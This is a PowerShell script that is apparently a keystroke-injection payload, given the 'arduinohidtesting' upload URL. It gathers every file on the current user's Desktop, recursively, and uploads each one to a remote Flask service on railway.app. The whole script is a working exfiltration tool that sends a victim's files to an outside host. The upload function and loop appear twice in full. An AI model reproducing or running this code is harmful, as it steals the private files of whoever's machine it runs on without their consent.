# CONFIGURATION
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$Url = "arduinohidtesting-production.up.railway.app/upload"  # Change this to your deployed service URL

# Get all files recursively
$Files = Get-ChildItem -Path $DesktopPath -Recurse -File

# Simple function to upload file using WebClient - compatible with Flask servers and older PowerShell versions
function Send-FileToFlask {
    param(
        [string]$Uri,
        [string]$FilePath
    )
    
    try {
        $webClient = New-Object System.Net.WebClient
        
        # Create a form field with the name "file" that Flask expects by default
        $fieldName = "file"
        
        # Create multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $bodyLines = New-Object System.Collections.ArrayList
        
        # Add file data
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        
        # Construct the multipart form body
        [void]$bodyLines.Add("--$boundary")
        [void]$bodyLines.Add("Content-Disposition: form-data; name=`"$fieldName`"; filename=`"$fileName`"")
        [void]$bodyLines.Add("Content-Type: application/octet-stream")
        [void]$bodyLines.Add("")
        $bodyLinesString = $bodyLines -join $LF
        
        # Convert body lines to bytes
        $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyLinesString + $LF)
        
        # Add closing boundary
        $endBytes = [System.Text.Encoding]::ASCII.GetBytes("$LF--$boundary--$LF")
        
        # Combine all bytes
        $requestBytes = New-Object System.Collections.ArrayList
        [void]$requestBytes.AddRange($bodyBytes)
        [void]$requestBytes.AddRange($fileBytes)
        [void]$requestBytes.AddRange($endBytes)
        
        # Send the data
        $response = $webClient.UploadData($Uri, "POST", $requestBytes.ToArray())
        
        return [System.Text.Encoding]::ASCII.GetString($response)
    }
    catch {
        throw $_
    }
}

foreach ($File in $Files) {
    try {
        Write-Host "Uploading: $($File.FullName)"
        
        # This method is optimized for Flask servers and works across PowerShell versions
        $result = Send-FileToFlask -Uri $Url -FilePath $File.FullName
        
        Write-Host "Uploaded: $($File.Name)"
        Write-Host "Server response: $result`n"
    }
    catch {
        Write-Warning "Failed to upload: $($File.FullName). Error: $_"
    }
}

# Simple function to upload file using WebClient - compatible with Flask servers and older PowerShell versions
function Send-FileToFlask {
    param(
        [string]$Uri,
        [string]$FilePath
    )
    
    try {
        $webClient = New-Object System.Net.WebClient
        
        # Create a form field with the name "file" that Flask expects by default
        $fieldName = "file"
        
        # Create multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $bodyLines = New-Object System.Collections.ArrayList
        
        # Add file data
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        
        # Construct the multipart form body
        [void]$bodyLines.Add("--$boundary")
        [void]$bodyLines.Add("Content-Disposition: form-data; name=`"$fieldName`"; filename=`"$fileName`"")
        [void]$bodyLines.Add("Content-Type: application/octet-stream")
        [void]$bodyLines.Add("")
        $bodyLinesString = $bodyLines -join $LF
        
        # Convert body lines to bytes
        $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($bodyLinesString + $LF)
        
        # Add closing boundary
        $endBytes = [System.Text.Encoding]::ASCII.GetBytes("$LF--$boundary--$LF")
        
        # Combine all bytes
        $requestBytes = New-Object System.Collections.ArrayList
        [void]$requestBytes.AddRange($bodyBytes)
        [void]$requestBytes.AddRange($fileBytes)
        [void]$requestBytes.AddRange($endBytes)
        
        # Send the data
        $response = $webClient.UploadData($Uri, "POST", $requestBytes.ToArray())
        
        return [System.Text.Encoding]::ASCII.GetString($response)
    }
    catch {
        throw $_
    }
}

foreach ($File in $Files) {
    try {
        Write-Host "Uploading: $($File.FullName)"
        
        # This method is optimized for Flask servers and works across PowerShell versions
        $result = Send-FileToFlask -Uri $Url -FilePath $File.FullName
        
        Write-Host "Uploaded: $($File.Name)"
        Write-Host "Server response: $result`n"
    }
    catch {
        Write-Warning "Failed to upload: $($File.FullName). Error: $_"
    }
}